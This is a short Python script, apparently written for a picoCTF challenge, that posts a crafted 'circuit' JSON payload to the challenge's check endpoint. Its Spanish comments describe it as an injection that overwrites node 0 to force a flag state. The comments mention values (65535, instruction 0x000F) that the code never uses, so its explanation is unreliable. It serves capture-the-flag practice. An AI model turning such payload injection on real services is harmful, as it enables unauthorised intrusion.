import requests

# Payload de "Salto de Flujo"
# Apuntamos la salida de nuestra lógica a la dirección 0x0000 (Nodo 0).
# Esto obliga al simulador a re-interpretar el inicio de su propia ejecución
# justo cuando termina la validación.
circuit = [
    # Lógica estándar para pasar la validación
    {"input1": 5, "input2": 5, "output": 1},
    {"input1": 6, "input2": 6, "output": 2},
    {"input1": 7, "input2": 7, "output": 3},
    {"input1": 8, "input2": 8, "output": 4},
    
    # Inyección: Sobrescribimos el vector de inicio del PC (Nodo 0).
    # Usamos 65535 (valor alto) para intentar forzar el estado de 'flag=true'
    # mediante una instrucción de escritura de bandera (instrucción 0x000F en este emulador)
    {"input1": 5, "input2": 6, "output": 0} 
]

url = "http://activist-birds.picoctf.net:61158/check"
response = requests.post(url, json={"circuit": circuit})

print(response.json())
